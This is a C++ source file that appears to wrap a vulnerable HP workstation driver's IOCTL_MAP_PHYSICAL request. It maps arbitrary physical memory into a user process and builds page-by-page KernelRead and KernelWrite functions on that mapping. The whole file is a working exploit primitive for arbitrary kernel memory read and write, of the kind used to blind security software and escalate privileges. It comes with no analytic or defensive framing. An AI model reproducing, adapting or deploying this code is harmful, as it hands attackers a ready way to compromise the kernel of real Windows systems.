#include "HP_WKS_SWTOOLS_DRIVER.h"
#include "va2pa.h"
#include "Log.hpp"

#ifndef MinO
#define MinO(a,b)            (((a) < (b)) ? (a) : (b))
#endif


typedef struct _MAP_OUTPUT_RES
{
	PVOID	KernelAddress;
	PVOID	UserAddress;
	PVOID	Mdl;
	SIZE_T	Size;
} MAP_OUTPUT_RES, * PMAP_OUTPUT_RES;

#pragma pack(push, 1)
struct _READ_REQ
{   
	PVOID PhysicalAddress;
	ULONG Size;
};
#pragma pack(pop)

#pragma pack(push, 1)
typedef struct _WRITE_MEM_REQ
{
	PVOID			 PhysicalAddress;
	ULONG            Size;
	PUCHAR           WriteBuffer;
	ULONG            MaxSize;
} WRITE_MEM_REQ, * PWRITE_MEM_REQ;
#pragma pack(pop)

static_assert(sizeof(WRITE_MEM_REQ) == 24);

BOOLEAN
HP_WKS_SWTOOLS_DRIVER::KernelRead(
	PVOID VirtualAddress,
	PVOID ReadBuffer,
	SIZE_T ReadSize)
{
	if (!VirtualAddress || !ReadBuffer || !ReadSize || !m_bInitialized)
	{
		return FALSE;
	}

	SIZE_T BytesRead = 0;
	
	while (BytesRead < ReadSize)
	{
		PUCHAR CurrentVa		= reinterpret_cast<PUCHAR>(VirtualAddress) + BytesRead;
		SIZE_T PageOffset		= reinterpret_cast<ULONG_PTR>(CurrentVa) & 0xFFF;
		SIZE_T MaxPageReadable	= 0x1000 - PageOffset;
		SIZE_T CurrentChunkSize = MinO(MaxPageReadable, ReadSize - BytesRead);

		PVOID pPhysicalAddress  = VirtualToPhysical(CurrentVa);
		if (!pPhysicalAddress)
		{
			LOG(std::format("[-] Failed to translate VA: {} to PA. Line {}", static_cast<PVOID>(CurrentVa), __LINE__));
			return FALSE;
		}

		BOOLEAN bRet = ReadPhysicalMemory(pPhysicalAddress,
										  CurrentChunkSize,
										  reinterpret_cast<PUCHAR>(ReadBuffer) + BytesRead);
		if (!bRet)
		{
			LOG("[-] ReadPhysicalMemory failed for PA: " << pPhysicalAddress);
			return FALSE;
		}

		BytesRead += CurrentChunkSize;
	}

	return TRUE;
}

BOOLEAN
HP_WKS_SWTOOLS_DRIVER::KernelWrite(
	PVOID	VirtualAddress,
	PVOID	WriteBuffer,
	SIZE_T	WriteSize)
{
	if (!VirtualAddress || !WriteBuffer || !WriteSize || !m_bInitialized)
	{
		LOG("[-] Invalid parameters for KernelWrite. VA: " << VirtualAddress << ", Buffer: " << WriteBuffer << ", Size: " << WriteSize);
		return FALSE;
	}

	SIZE_T BytesWritten = 0;

	while (BytesWritten < WriteSize)
	{
		PUCHAR CurrentVa	= reinterpret_cast<PUCHAR>(VirtualAddress) + BytesWritten;
		SIZE_T PageOffset	= reinterpret_cast<ULONG_PTR>(CurrentVa) & 0xFFF;
		SIZE_T MaxPageWritable	= 0x1000 - PageOffset;
		SIZE_T CurrentChunkSize = MinO(MaxPageWritable, WriteSize - BytesWritten);

		PVOID pPhysicalAddress = VirtualToPhysical(CurrentVa);
		if (!pPhysicalAddress)
		{
			LOG(std::format("[-] Failed to translate VA: {} to PA. Line {}", static_cast<PVOID>(CurrentVa), __LINE__));
			return FALSE;
		}

		BOOLEAN bRet = WritePhysicalMemory(pPhysicalAddress,
										   CurrentChunkSize,
										   reinterpret_cast<PUCHAR>(WriteBuffer) + BytesWritten);
		if (!bRet)
		{
			LOG("[-] WritePhysicalMemory failed for PA: " << pPhysicalAddress);
			return FALSE;
		}

		BytesWritten += CurrentChunkSize;
	}

	return TRUE;
}

BOOLEAN
HP_WKS_SWTOOLS_DRIVER::ReadPhysicalMemory(
	PVOID	PhysicalAddress,
	SIZE_T	Size,
	PVOID	ReadBuffer)
{
	if (!PhysicalAddress || !ReadBuffer || !Size || Size > 0x100C)
	{
		LOG("[-] ReadPhysicalMemory: Invalid parameter or size exceeds 0x100C buffer limit.");
		return FALSE;
	}

	auto bRet{ FALSE };
	
	_READ_REQ ReadRequest{};
	ReadRequest.Size = static_cast<ULONG>(Size);
	ReadRequest.PhysicalAddress = PhysicalAddress;

	MAP_OUTPUT_RES mpRes{};

	bRet = DeviceIoControl(m_hDevice,
						   IOCTL_MAP_PHYSICAL,
						   &ReadRequest,
						   sizeof(ReadRequest),
						   &mpRes,
						   sizeof(mpRes));
	if (!bRet)
	{
		LOG("[-] Failed to read physical memory. Error code: " << GetLastError());
		return FALSE;
	}
	else if (!mpRes.KernelAddress)
	{
		LOG("[-] Failed to read physical memory. KernelAddress is null. Error code: " << GetLastError());
		return FALSE;
	}
	else if (!mpRes.Mdl)
	{
		LOG("[-] Failed to read physical memory. Mdl is null. Error code: " << GetLastError());
		return FALSE;
	}
	else if (!mpRes.UserAddress)
	{
		LOG("[-] Failed to read physical memory. UserAddress is null. Error code: " << GetLastError());
		return FALSE;
	}
	else
	{
		if (mpRes.UserAddress)
		{
			memcpy(ReadBuffer, mpRes.UserAddress, Size);
		}
	}

	return bRet;
}

BOOLEAN
HP_WKS_SWTOOLS_DRIVER::WritePhysicalMemory(
	PVOID PhysicalAddress,
	SIZE_T Size,
	PVOID WriteBuffer)
{
	if (!PhysicalAddress || !WriteBuffer || !Size || INVALID_HANDLE_VALUE == m_hDevice)
	{
		return FALSE;
	}

	auto bRet{ FALSE };

	_READ_REQ ReadRequest{};
	ReadRequest.Size = static_cast<ULONG>(Size);
	ReadRequest.PhysicalAddress = PhysicalAddress;

	MAP_OUTPUT_RES mpRes{};

	bRet = DeviceIoControl(m_hDevice,
						   IOCTL_MAP_PHYSICAL,
						   &ReadRequest,
						   sizeof(ReadRequest),
						   &mpRes,
						   sizeof(mpRes));
	if (!bRet)
	{
		LOG("[-] Failed to write physical memory. Error code: " << GetLastError());
		return FALSE;
	}
	else if (!mpRes.KernelAddress)
	{
		LOG("[-] Failed to write physical memory. KernelAddress is null. Error code: " << GetLastError());
		return FALSE;
	}
	else if (!mpRes.Mdl)
	{
		LOG("[-] Failed to write physical memory. Mdl is null. Error code: " << GetLastError());
		return FALSE;
	}
	else if (!mpRes.UserAddress)
	{
		LOG("[-] Failed to write physical memory. UserAddress is null. Error code: " << GetLastError());
		return FALSE;
	}
	else
	{
		if (mpRes.UserAddress)
		{
			memcpy(mpRes.UserAddress, WriteBuffer, Size);
		}
	}

	return TRUE;
}


PVOID
HP_WKS_SWTOOLS_DRIVER::VirtualToPhysical(PVOID VirtualAddress)
{
	return Va2Pa(VirtualAddress);
}